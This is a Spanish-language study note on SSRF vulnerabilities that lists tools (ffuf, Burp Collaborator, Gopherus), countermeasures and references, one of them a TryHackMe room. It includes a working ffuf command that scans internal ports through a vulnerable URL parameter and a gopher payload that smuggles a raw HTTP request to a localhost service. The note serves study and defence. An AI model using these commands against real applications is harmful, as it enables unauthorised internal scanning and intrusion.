# Análisis de SSRF (Server-Side Request Forgery)

## Descripción
La vulnerabilidad SSRF permite a un atacante inducir a una aplicación web a realizar peticiones HTTP (o de otros protocolos) hacia una infraestructura interna o externa arbitraria. Esto se utiliza comúnmente para acceder a servicios internos protegidos por firewalls, realizar escaneos de puertos locales o exfiltrar metadatos de instancias en la nube.

## Clasificación
- **Fase**: Análisis de Vulnerabilidades
- **MITRE ATT&CK**: T1190 (Exploit Public-Facing Application)
- **Plataforma**: Web
- **Dificultad**: Avanzada

## Herramientas
- **ffuf** (`-w`, `-u`) — útil para descubrir servicios internos mediante el fuzzeo de puertos o rutas locales.
- **Burp Suite** (Collaborator) — para confirmar interacciones fuera de banda (OOB).
- **Gopherus** — herramienta para generar payloads del protocolo gopher para atacar servicios internos (Redis, MySQL, etc.).

## Comandos / Ejemplos

### Descubrimiento de puertos internos con ffuf
```bash
# Escaneo de puertos en localhost a través de un parámetro vulnerable
ffuf -w ports.txt:FUZZ -u http://target.com/preview.php?url=http://127.0.0.1:FUZZ -fs 0
# Resultado: Identificación de servicios corriendo en 127.0.0.1 (ej. puerto 10000)
```

### Explotación avanzada con protocolo Gopher
```bash
# Payload gopher para enviar datos TCP arbitrarios (HTTP GET interno)
gopher://127.0.0.1:10000/_GET%20/customapi%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0A%0D%0A
# El prefijo '_' se usa comúnmente para enviar el payload como datos crudos
```

## Contramedidas
- Implementar listas blancas de dominios y protocolos permitidos.
- Validar y sanitizar todas las entradas de usuario que se utilicen en funciones de red.
- Aislar la red de la aplicación mediante segmentación estricta y firewalls.

## Referencias
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
- Notas del proyecto: notas-md/HNotes/HNotes/TryHackMe/Extract Room.md
